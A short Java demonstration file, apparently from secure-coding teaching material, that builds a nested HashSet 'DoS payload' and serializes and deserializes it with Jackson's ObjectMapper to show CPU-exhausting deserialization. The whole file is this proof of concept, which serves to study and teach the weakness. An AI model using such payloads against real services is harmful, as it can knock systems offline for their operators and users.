// The MIT License (MIT)
// Copyright (c) 2018 Robert C. Seacord
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;
import javassist.CannotCompileException;
import javassist.NotFoundException;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.*;

public class DOS {

  // Deserializing the HashSet will recurse indefinitely, consuming CPU
  private static Object DoSpayload() {
    Set<Object> root = new HashSet<>();
    Set<Object> s1 = root;
    Set<Object> s2 = new HashSet<>();
    for (int i = 0; i < 100; i++) {
      Set<Object> t1 = new HashSet<>();
      Set<Object> t2 = new HashSet<>();
      t1.add("foo"); // make it not equal to t2
      s1.add(t1);
      s1.add(t2);
      s2.add(t1);
      s2.add(t2);
      s1 = t1;
      s2 = t2;
    }
    return root;
  }

  public static void main(String[] args) throws
      IllegalAccessException, ClassNotFoundException, InstantiationException, CannotCompileException,
      NotFoundException, IOException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {

    ObjectMapper mapper = new ObjectMapper();
    // mapper.enableDefaultTyping();

    // serialize DoS payload
    String json = mapper.writeValueAsString(DoSpayload());
    System.out.println(json);

    // deserialize as Object or permissive tag interfaces such as java.io.Serializable
    Object obj = mapper.readValue(json, Object.class);
    Class cls = obj.getClass();
    System.out.println("The type of the object is: " + cls.getName());
    System.out.println(obj);
  }
} // end class DOS

